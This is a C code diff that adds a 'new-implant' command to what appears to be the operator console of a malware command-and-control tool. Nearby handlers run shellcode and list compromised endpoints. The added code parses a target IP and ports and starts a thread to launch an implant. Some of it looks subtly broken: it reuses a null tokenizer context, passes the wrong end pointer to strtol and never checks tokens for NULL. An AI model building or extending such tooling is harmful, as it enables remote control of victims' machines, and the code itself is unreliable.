@@ -473,6 +473,38 @@ int _handle_unhook_byon(char* user_input,
 	return 0;
 }
 
+int _handle_new_implant(char* user_input,
+	char** tok_ctx_ptr,
+	struct cli_info_t* cli_info,
+	struct bleeddial_ctx_t* ctx) {
+
+	struct newimplant_params_t* params;
+	params = calloc(1, sizeof(*params));
+	if (params == 0) return -1;
+
+	char* tok;
+	char* file_name_ptr;
+	char* context = NULL;
+
+	tok = strtok_s(NULL, " ", &context);
+	strncpy_s(params->ip, 15, tok, _TRUNCATE);
+
+	tok = strtok_s(NULL, " ", &context);
+	strncpy_s(params->remote_port, 15, tok, _TRUNCATE);
+
+	tok = strtok_s(NULL, " ", &context);
+	strncpy_s(params->local_port, 15, tok, _TRUNCATE);
+
+	tok = strtok_s(NULL, " \n", &context);
+	params->ctrl_stream = strtol(tok, ctx, 10);
+
+	params->ctx = ctx;
+
+	CreateThread(NULL, 0, thread_newimplant, params, 0, 0);
+
+	return 0;
+}
+
 int _handle_run_shellcode(char* user_input,
 	char** tok_ctx_ptr,
 	struct cli_info_t* cli_info,
@@ -583,6 +615,9 @@ int _handle_user_input(char* user_input,
 		}
 		if (strncmp(first_word, "print-nexus-key", 15) == 0) {
 			return _handle_print_nexus_key(user_input, &tok_ctx, cli_info, ctx);
+		}
+		if (strncmp(first_word, "new-implant", 15) == 0) {
+			return _handle_new_implant(user_input, &tok_ctx, cli_info, ctx);
 		}
 		if (strncmp(first_word, "list-endpoints", 14) == 0) {
 			return _handle_list_e(user_input, &tok_ctx, cli_info, ctx);
